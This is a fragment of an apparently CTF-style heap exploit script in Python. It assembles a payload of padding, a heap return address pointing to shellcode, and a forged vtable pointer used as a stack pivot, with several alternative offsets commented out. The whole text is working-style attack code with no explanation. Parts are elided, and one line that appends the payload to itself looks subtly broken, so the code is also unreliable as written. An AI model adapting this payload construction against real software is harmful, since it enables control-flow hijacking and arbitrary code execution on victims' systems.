...
"""
food_a = "A" * 24             # paading(buffer start addr <- 0x18 -> FOOD A start addr) 24byte
food_a += "A" * 16         # padding(unable use because of HeapFree(FOOD A)) 16byte
...
food_a += p(heap+0x6fc)       #  return addr: shellcode
#food_a += p(heap+0x6f9)       #  return addr: shellcode
#food_a += p(heap+0x2f4)       #  return addr: shellcode
#food_a += p(heap+0x53c)       #  return addr: shellcode
...
food_a += food_a.ljust(0x1e8) # padding(0x18+sizeof(FOOD A))
#food_a += food_a.ljust(0x20c) # padding(0x18+sizeof(FOOD A))
#food_a += food_a.ljust(0x248) # padding(0x18+sizeof(FOOD A))
victim = p(heap+0x6c8)        # vtable pointer(address of stack pivot)
#victim = p(heap+0x6c2)        # vtable pointer(address of stack pivot)
#victim = p(heap+0x668)        # vtable pointer(address of stack pivot)
